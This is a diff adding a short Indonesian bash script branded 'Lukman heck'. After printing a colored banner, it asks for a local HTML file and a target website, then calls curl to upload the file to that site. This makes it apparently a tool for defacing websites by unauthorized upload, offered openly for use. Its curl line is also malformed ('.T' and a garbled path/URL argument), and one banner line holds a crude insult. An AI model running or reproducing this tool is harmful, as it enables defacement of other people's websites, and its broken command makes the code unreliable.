@@ -1,0 +1,31 @@
+#jangan di jual
+#jangan di recod
+#jangan lupa nonton chenel yutub saya lukman heck
+white='\033[37;1m'
+purple='\033[35;1m'
+blue='\033[34;1m'
+yellow='\033[33;1m'
+green='\033[32;1m'
+red='\033[31;1m'
+cyan='\033[36;1m'
+
+
+
+
+clear
+figlet Lukman heck|lolcat
+echo  ""
+echo "maker  : nama lu siapa ngentod "
+echo "info 1 : 1 " |lolcat
+echo ""
+sleep 1
+
+echo "masukan SCRIPT anda/sdcard/index.html $(endc)  : " |lolcat
+read sc
+
+echo "web targed : "|lolcat
+read web
+
+curl .T /sdcard/$sc/$web
+
+echo "$(y) (OUTOPUT)"$web/$sc |lolcat
